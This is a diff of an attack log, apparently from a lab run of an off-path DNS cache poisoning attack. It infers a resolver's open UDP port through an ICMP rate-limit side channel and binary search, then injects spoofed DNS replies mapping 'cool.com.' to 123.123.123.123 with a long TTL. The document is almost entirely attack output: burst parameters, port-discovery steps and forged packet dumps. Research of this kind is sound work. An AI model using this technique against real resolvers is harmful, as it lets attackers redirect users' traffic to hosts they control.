@@ -1,22 +1,24 @@
+preparing spoofed replies.
+spoofed replies prepared.
+Time needed to prepare all spoofed replies: 153.43009494099988
 ----------Iteration 1 is starting.----------
 attack_burst: (port_start, # of probe, # of padding):50000,200,0
 Begin emission:
 Finished sending 1 packets.
 No port is open. IMCP rate limit is already drained.
 Got reply from do_one_attack_chunk : -1
-time needed in this iteration of loop: 1488 ms
+time needed in this iteration of loop: 1342 ms
 attack_burst: (port_start, # of probe, # of padding):50200,200,0
-Yaaay, got ICMP port unreachable message. At least one port is open.
-Got reply from do_one_attack_chunk : 50200
-attack_burst: (port_start, # of probe, # of padding):50200,100,100
 No port is open. IMCP rate limit is already drained.
-attack_burst: (port_start, # of probe, # of padding):50300,100,100
+Got reply from do_one_attack_chunk : -1
+time needed in this iteration of loop: 1456 ms
+attack_burst: (port_start, # of probe, # of padding):50400,200,0
 No port is open. IMCP rate limit is already drained.
-no open port found in bin search : -1
-time needed in this iteration of loop: 3940 ms
+Got reply from do_one_attack_chunk : -1
+time needed in this iteration of loop: 1322 ms
 Percent	Sum	Calls	Min	Max	Mean	Function
-100.0	5.428	4	1.263	1.488	1.357	do_one_chunk_of_attack
-5.428 Total Time
+100.0	4.120	3	1.322	1.456	1.373	do_one_chunk_of_attack
+4.120 Total Time
 ----------Iteration 1 is completed.----------
 ----------Iteration 2 is starting.----------
 attack_burst: (port_start, # of probe, # of padding):50000,200,0
@@ -25,22 +27,142 @@ Finished sending 1 packets.
 Yaaay, got ICMP port unreachable message. At least one port is open.
 Got reply from do_one_attack_chunk : 50000
 attack_burst: (port_start, # of probe, # of padding):50000,100,100
+No port is open. IMCP rate limit is already drained.
+attack_burst: (port_start, # of probe, # of padding):50100,100,100
 Yaaay, got ICMP port unreachable message. At least one port is open.
-attack_burst: (port_start, # of probe, # of padding):50000,50,150
+attack_burst: (port_start, # of probe, # of padding):50100,50,150
+Yaaay, got ICMP port unreachable message. At least one port is open.
+attack_burst: (port_start, # of probe, # of padding):50100,25,175
+Yaaay, got ICMP port unreachable message. At least one port is open.
+attack_burst: (port_start, # of probe, # of padding):50100,13,187
+Yaaay, got ICMP port unreachable message. At least one port is open.
+attack_burst: (port_start, # of probe, # of padding):50100,7,193
+Yaaay, got ICMP port unreachable message. At least one port is open.
+attack_burst: (port_start, # of probe, # of padding):50100,4,196
 No port is open. IMCP rate limit is already drained.
-attack_burst: (port_start, # of probe, # of padding):50050,50,150
+attack_burst: (port_start, # of probe, # of padding):50104,3,197
+Yaaay, got ICMP port unreachable message. At least one port is open.
+attack_burst: (port_start, # of probe, # of padding):50104,2,198
 No port is open. IMCP rate limit is already drained.
-no open port found in bin search : -1
-time needed in this iteration of loop: 5380 ms
-attack_burst: (port_start, # of probe, # of padding):50200,200,0
-No port is open. IMCP rate limit is already drained.
-Got reply from do_one_attack_chunk : -1
-time needed in this iteration of loop: 1305 ms
-Percent	Sum	Calls	Min	Max	Mean	Function
-100.0	12.113	9	1.263	1.488	1.346	do_one_chunk_of_attack
-12.113 Total Time
+attack_burst: (port_start, # of probe, # of padding):50106,1,199
+Yaaay, got ICMP port unreachable message. At least one port is open.
+attack_burst: (port_start, # of probe, # of padding):50106,1,199
+Yaaay, got ICMP port unreachable message. At least one port is open.
+
+
+
+open port found in bin search : 50106
+
+
+
+---------------found the exact port.--------------
+
+Received 27 packets, got 1 answers, remaining 0 packets
+
+Received 24 packets, got 1 answers, remaining 0 packets
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 78
+  id        = 2473
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = udp
+  chksum    = 0x7ba2
+  src       = 192.168.58.2
+  dst       = 192.168.58.1
+  \options   \
+###[ UDP ]### 
+     sport     = domain
+     dport     = 9554
+     len       = 58
+     chksum    = 0xf620
+###[ DNS ]### 
+        id        = 0
+        qr        = 1
+        opcode    = QUERY
+        aa        = 1
+        tc        = 0
+        rd        = 1
+        ra        = 1
+        z         = 0
+        ad        = 0
+        cd        = 0
+        rcode     = ok
+        qdcount   = 1
+        ancount   = 1
+        nscount   = 0
+        arcount   = 0
+        \qd        \
+         |###[ DNS Question Record ]### 
+         |  qname     = 'cool.com.'
+         |  qtype     = A
+         |  qclass    = IN
+        \an        \
+         |###[ DNS Resource Record ]### 
+         |  rrname    = 'cool.com.'
+         |  type      = A
+         |  rclass    = IN
+         |  ttl       = 70000
+         |  rdlen     = None
+         |  rdata     = 123.123.123.123
+        ns        = None
+        ar        = None
+
+None
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 78
+  id        = 2473
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = udp
+  chksum    = 0x7ba2
+  src       = 192.168.58.2
+  dst       = 192.168.58.1
+  \options   \
+###[ UDP ]### 
+     sport     = domain
+     dport     = 9554
+     len       = 58
+     chksum    = 0xf620
+###[ DNS ]### 
+        id        = 0
+        qr        = 1
+        opcode    = QUERY
+        aa        = 1
+        tc        = 0
+        rd        = 1
+        ra        = 1
+        z         = 0
+        ad        = 0
+        cd        = 0
+        rcode     = ok
+        qdcount   = 1
+        ancount   = 1
+        nscount   = 0
+        arcount   = 0
+        \qd        \
+         |###[ DNS Question Record ]### 
+         |  qname     = 'cool.com.'
+         |  qtype     = A
+         |  qclass    = IN
+        \an        \
+         |###[ DNS Resource Record ]### 
+         |  rrname    = 'cool.com.'
+         |  type      = A
+         |  rclass    = IN
+         |  ttl       = 70000
+         |  rdlen     = None
+         |  rdata     = 123.123.123.123
+        ns        = None
+        ar        = None
+
+None
+time needed to sent all: 2765 ms
 ----------Iteration 2 is completed.----------
-
-Received 29 packets, got 0 answers, remaining 1 packets
-
-Received 26 packets, got 0 answers, remaining 1 packets
